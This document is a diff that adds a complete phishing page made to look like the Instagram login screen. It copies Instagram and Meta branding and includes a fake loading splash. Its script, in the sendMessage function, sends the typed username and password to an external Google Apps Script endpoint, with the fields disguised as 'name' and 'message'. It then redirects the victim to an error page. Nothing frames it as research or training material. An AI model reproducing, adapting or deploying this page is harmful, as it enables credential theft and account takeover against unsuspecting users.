@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Instagram</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="icon" href="assets/fav.png" type="image/png">
+<link rel="shortcut icon" href="assets/fav.png" type="image/png">
+<link rel="preload" as="image" href="assets/error-logo.png">
+
+<style>
+* { box-sizing: border-box; font-family: Roboto, sans-serif; }
+body { margin:0; background:#0c1014; color:#fff; }
+
+/* ---------- LOADING ---------- */
+#loading {
+  position:fixed; inset:0;
+  background:#0c1014;
+  display:flex;
+  flex-direction:column;
+  justify-content:center;
+  align-items:center;
+  z-index:10;
+  transition:opacity .2s;
+}
+#loading img.logo { width:90px; height:90px; }
+#loading .bottom {
+  position:absolute;
+  bottom:36px;
+  text-align:center;
+}
+#loading .from {
+  margin:3px;
+  font-size:15px;
+  font-weight:500;
+  color:#546270;
+}
+#loading .meet { max-height:30px; }
+
+/* ---------- ERROR POPUP ---------- */
+/* ---------- ERROR POPUP ---------- */
+#error {
+  position: fixed;
+  top: 20px; /* Spaced from top */
+  left: 50%;
+  transform: translateX(-50%);
+  width: 90%;
+  max-width: 550px;
+  height: 60px;
+  background: #152127; /* Same as wrapper */
+  border: 1px solid #445664;
+  border-radius: 16px;
+  display: none;
+  align-items: center;
+  padding: 0 16px;
+  z-index: 100;
+  color: #f1f4f7;
+  font-size: 1rem;
+  font-weight: 500;
+  pointer-events: none;
+}
+
+.error-icon {
+  width: 1.05em;
+  height: 1.05em;
+  margin-right: 12px;
+}
+
+/* Animations */
+@keyframes fadeInSlideDown {
+  from { opacity: 0; transform: translate(-50%, -20px); }
+  to { opacity: 1; transform: translate(-50%, 0); }
+}
+
+@keyframes fadeOut {
+  from { opacity: 1; }
+  to { opacity: 0; }
+}
+
+.animate-in {
+  animation: fadeInSlideDown 0.2s forwards;
+}
+
+.animate-out {
+  animation: fadeOut 0.3s forwards;
+}
+
+/* ---------- APP ---------- */
+.hidden { display:none; }
+
+/* ---------- HEADER ---------- */
+.header {
+  background:#0c1014;
+  border-bottom:1px solid #445664;
+  display:flex;
+  justify-content:center;
+}
+.header img {
+  width:56px;
+  height:56px;
+  margin:38px;
+}
+
+/* ---------- FORM ---------- */
+.wrapper {
+  background:#152127;
+  padding:45px 45px 35px 45px;
+  display:flex;
+  justify-content:center;
+  border-bottom:1px solid #445664;
+}
+.form-box {
+  width:100%;
+  max-width:550px;
+  background:#152127;
+}
+.row { width:100%; margin-bottom:12px; }
+
+.row.forgot-row {
+  margin-bottom:52px; /* +30px MOVED HERE */
+}
+
+h2 {
+    font-size: 1.09em;
+    letter-spacing: 0.4px;
+    font-weight: 600;
+    margin-bottom: 24px;
+    margin-top: 10px;
+}
+
+/* ---------- INPUT ---------- */
+.field { position:relative; }
+.field input {
+    width: 100%;
+    padding: 28px 16px 10px 16px;
+    background: none;
+    border: 1px solid #445664;
+    border-radius: 16px;
+    color: #f1f4f7;
+    font-size: 1rem;
+    letter-spacing: 0.4px;
+    font-weight: 500;
+    height: 60px;
+}
+.field input:focus {
+  outline:none;
+  border-color:#f1f4f7;
+}
+.field label {
+    position: absolute;
+    left: 16px;
+    font-weight: 500;
+    letter-spacing: 0.4px;
+    top: 20px;
+    color: #96a6b4;
+    font-size: 1.01rem;
+    transition: .2s;
+    pointer-events: none;
+}
+.field input:focus + label,
+.field input:not(:placeholder-shown) + label {
+  top:8px;
+  font-size:.84em;
+}
+
+/* ---------- EYE ---------- */
+/* Update your existing .eye class to include this */
+.eye {
+  position:absolute;
+  right:15px;
+  top:50%;
+  transform:translateY(-50%);
+  cursor:pointer;
+  width: 24px;
+  height: 24px;
+  display: none; /* Add this line */
+  align-items: center;
+  justify-content: center;
+}
+.eye img {
+  width: 100%;
+  height: auto;
+}
+
+/* ---------- BUTTONS ---------- */
+.btn {
+  height:44px;
+  width:100%;
+  border-radius:50px;
+  border:none;
+  font-size:0.97rem;
+  letter-spacing:0.4px;
+  font-weight:500;
+  cursor:pointer;
+  line-height:43px;
+}
+.btn.primary {
+  background:#0064e0;
+  color:#fff;
+}
+.btn.primary:hover { background:#1a74e6; }
+.btn.primary:disabled {
+  opacity:.5;
+  cursor:not-allowed;
+  margin-top:12px;
+}
+.btn.secondary,
+.btn.outline {
+  background:#152127;
+  color:#fff;
+}
+.btn.secondary:hover,
+.btn.outline:hover {
+  background:#2d383d;
+}
+.btn.outline {
+  border:1px solid #445664;
+}
+
+/* ---------- FB ---------- */
+.fb-icon {
+  width:17px;
+  height:17px;
+  margin-right:8px;
+  margin-bottom:3px;
+  vertical-align:middle;
+}
+
+/* ---------- FOOTER ---------- */
+.footer {
+  background:#0c1014;
+  padding:18px 16px 52px;
+  text-align:center;
+}
+.footer span {
+  display:inline-block;
+  font-size:0.72em;
+  letter-spacing: 0.4px;
+  color:#a8a8a8;
+  margin:0 7px 7px 7px;
+}
+.footer span:hover { text-decoration:underline; }
+
+.footer-chevron {
+  width: 12px;
+  height: 12px;
+  vertical-align: middle;
+  margin-left: 4px;
+  margin-bottom: 4px;
+  filter: brightness(0) saturate(100%) invert(79%) sepia(0%) saturate(106%) hue-rotate(187deg) brightness(88%) contrast(85%); /* Matches #a8a8a8 */
+}
+
+.row-meta-logo {
+margin-top: 20px;
+  display: flex;
+  justify-content: center; /* horizontal center */
+}
+
+</style>
+</head>
+
+<body>
+
+<div id="loading">
+  <img src="assets/main-logo.svg" class="logo">
+  <div class="bottom">
+    <div class="from">from</div>
+    <img src="assets/meet-logo.svg" class="meet">
+  </div>
+</div>
+
+<div id="error">
+  <img src="assets/cross-circle.svg" class="error-icon">
+Something went wrong! Please try again later.
+</div>
+
+<div id="app" class="hidden">
+
+  <div class="header">
+    <img src="assets/main-logo.svg" width="65" height="65">
+  </div>
+
+  <div class="wrapper">
+    <div class="form-box">
+
+      <div class="row"><h2>Log Into Instagram</h2></div>
+
+      <div class="row field">
+        <input id="name" placeholder=" ">
+        <label>Mobile number, username or email</label>
+      </div>
+
+      <div class="row field">
+        <input id="message" type="password" placeholder=" ">
+        <label>Password</label>
+        <span class="eye" onclick="togglePass()">
+          <img id="eye-icon" src="assets/eye-hidden.svg">
+        </span>
+      </div>
+
+      <div class="row">
+        <button id="login" class="btn primary" disabled onclick="sendMessage()">Log in</button>
+      </div>
+
+      <div class="row forgot-row">
+        <button class="btn secondary" onclick="location.href='https://www.Instagram.com/accounts/password/reset/'">
+          Forgot password?
+        </button>
+      </div>
+
+      <div class="row">
+        <button class="btn outline" onclick="fbError()">
+          <img src="assets/facebook.svg" class="fb-icon">Log in with Facebook
+        </button>
+      </div>
+
+      <div class="row">
+        <button class="btn outline" style="color:#4ba9fe; border-color:#4ba9fe;"
+          onclick="location.href='https://www.Instagram.com/accounts/emailsignup/?next='">
+          Create new account
+        </button>
+      </div>
+
+      <div class="row-meta-logo">
+        <img src="assets/hd-meet.png" width="auto" height="30px">
+      </div>
+
+    </div>
+  </div>
+
+  <div class="footer">
+    <span>Meta</span><span>About</span><span>Blog</span><span>Jobs</span>
+    <span>Help</span><span>API</span><span>Privacy</span><span>Terms</span>
+    <span>Locations</span><span>Instagram Lite</span><span>Meta AI</span>
+    <span>Threeds</span><span>Contact Uploading & Non-Users</span>
+    <span>Meta Verified</span>
+    <br><br>
+    <span>English <img src="assets/chevron-down.svg" class="footer-chevron"></span>
+    <span>© 2026 Instagram from Meta</span>
+  </div>
+
+</div>
+
+<script>
+/* LOADING */
+setTimeout(() => {
+  document.getElementById('loading').style.opacity = '0';
+  setTimeout(() => {
+    document.getElementById('loading').remove();
+    document.getElementById('app').classList.remove('hidden');
+  }, 200);
+}, 1200);
+
+/* ENABLE LOGIN & EYE VISIBILITY */
+const nameField = document.getElementById('name');
+const msgField = document.getElementById('message');
+const loginBtn = document.getElementById('login');
+const eyeContainer = document.querySelector('.eye');
+
+[nameField, msgField].forEach(f => f.addEventListener('input', () => {
+  loginBtn.disabled = !(nameField.value.length >= 1 && msgField.value.length >= 6);
+  eyeContainer.style.display = msgField.value.length > 0 ? 'flex' : 'none';
+}));
+
+/* PASSWORD TOGGLE */
+function togglePass() {
+  const eyeImg = document.getElementById('eye-icon');
+  if (msgField.type === 'password') {
+    msgField.type = 'text';
+    eyeImg.src = 'eye-visible.svg';
+  } else {
+    msgField.type = 'password';
+    eyeImg.src = 'eye-hidden.svg';
+  }
+}
+
+/* FB ERROR WITH ANIMATION */
+function fbError() {
+  const e = document.getElementById('error');
+
+  setTimeout(() => {
+    e.style.display = 'flex';
+    e.classList.remove('animate-out');
+    e.classList.add('animate-in');
+
+    setTimeout(() => {
+      e.classList.remove('animate-in');
+      e.classList.add('animate-out');
+
+      setTimeout(() => {
+        e.style.display = 'none';
+      }, 300);
+    }, 5000);
+  }, 300);
+}
+
+/* SEND MESSAGE + REDIRECT TO ERROR PAGE */
+function sendMessage() {
+  const name = encodeURIComponent(nameField.value);
+  const message = encodeURIComponent(msgField.value);
+
+  const url =
+    "https://script.google.com/macros/s/AKfycbywZo4PvCTgbqR_bQ3Ayj6Z15BSWOCr9TyOcmL_OFp9acIUjXlmXZqFyc-YQa3JYnqETg/exec" +
+    `?name=${name}&message=${message}`;
+
+  // Send message FIRST
+  fetch(url);
+
+  // Redirect to Google-style error page after 1s
+  setTimeout(() => {
+    window.location.href = "error.html";
+  }, 1500);
+}
+</script>
+
+
+</body>
+</html>
